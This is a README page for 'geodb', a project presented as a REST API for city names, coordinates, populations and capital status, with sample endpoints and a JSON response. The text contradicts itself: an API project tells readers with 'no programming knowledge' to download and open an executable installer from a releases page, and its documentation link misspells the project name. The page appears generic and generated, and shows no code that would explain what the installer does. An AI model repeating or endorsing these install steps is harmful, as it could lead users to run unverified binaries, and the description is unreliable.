---
layout: "default"
title: "🌍 geodb - Access City and Geographic Data Easily"
description: "🌍 Access global city and geographic data easily with our REST API; retrieve names, coordinates, populations, and capital status in structured JSON format."
---
# 🌍 geodb - Access City and Geographic Data Easily

## 🚀 Getting Started

Welcome to **geodb**! This application provides an easy way to access city and geographic data through a REST API. You can retrieve city names, states, countries, coordinates, population details, and whether a city is a capital.

## 🎉 Features

- **City Information**: Get details on cities around the world.
- **Geographic Data**: Access data on coordinates and population.
- **REST API**: Simple integration with your applications.
- **User-Friendly Access**: No programming knowledge required to use our API.

## 📥 Download & Install

To get started, visit this page to download: [Download geodb](https://github.com/zedrider/geodb/releases).

After downloading, follow these steps:

1. Go to the releases page using the link above.
2. Find the latest version of geodb.
3. Click on the download link for your operating system. This will typically be a `.exe` file for Windows or a `.tar.gz` file for Linux.
4. Once the file downloads, open it to begin the installation.
5. Follow the on-screen instructions to complete the setup.

## 💻 System Requirements

Before you install, ensure your system meets these requirements:

- **Operating System**: Windows (7 or later), macOS (10.12 or later), or a recent Linux distribution.
- **Memory**: At least 4 GB of RAM.
- **Disk Space**: 100 MB of storage available for installation.
- **Network**: An internet connection to access city data.

## 🔍 How to Use geodb

Once installed, you can start using geodb to fetch city data. Here’s a simple guide:

1. **Open the Application**: Find the geodb application in your programs list and launch it.
2. **Enter a City Name**: Type the name of the city you want information about in the provided field.
3. **View Results**: Once you submit your query, geodb will display relevant information about the city, including state, country, coordinates, and population.

## 📂 Utilizing the REST API

If you want to delve deeper into geodb's capabilities, you can use the REST API.

1. **API Endpoint**: Access data through the endpoint at `/api/cities`.
2. **HTTP Requests**: Use GET requests to retrieve data. For example, to find information on New York, you would send a request to `/api/cities/NewYork`.
3. **Response Format**: The API returns data in JSON format, which is easy to understand. Here is an example response for New York:

```json
{
  "city": "New York",
  "state": "NY",
  "country": "USA",
  "coordinates": {
    "lat": 40.7128,
    "lng": -74.0060
  },
  "population": 8419600,
  "isCapital": false
}
```

## 🌐 Example Queries

Here are some example queries you can run with the API:

1. **Get City by Name**:
   Send a request to `/api/cities/{cityName}`. Replace `{cityName}` with the name of the city.
   
2. **Get All Cities**:
   Use `/api/cities` to get a list of all cities available in the database.

3. **Search by Country**:
   Query `/api/cities/country/{countryName}` to retrieve all cities in a specified country.

## 📚 Additional Topics Covered

If you are interested in other aspects of geographic and city data, geodb also covers:

- Address data
- Countries and states mapping
- Integration with smart cities projects

## 💬 Support

If you have any questions or need help:

- Check our GitHub Issues page for common questions and troubleshooting.
- Join our community discussions for tips and shared experiences.

## 🔗 Useful Links

For more information and updates, visit:

- [GitHub Repository](https://github.com/zedrider/geodb)
- [Documentation](https://gedb.readthedocs.io)

## 🔄 Contributions

We welcome contributions! If you'd like to help improve geodb, please read our contributing guidelines on GitHub. Your input helps us provide better tools for everyone.

## 📣 Closing Notes

Thank you for choosing geodb. We hope you find it useful for accessing city and geographic data effortlessly. Happy exploring!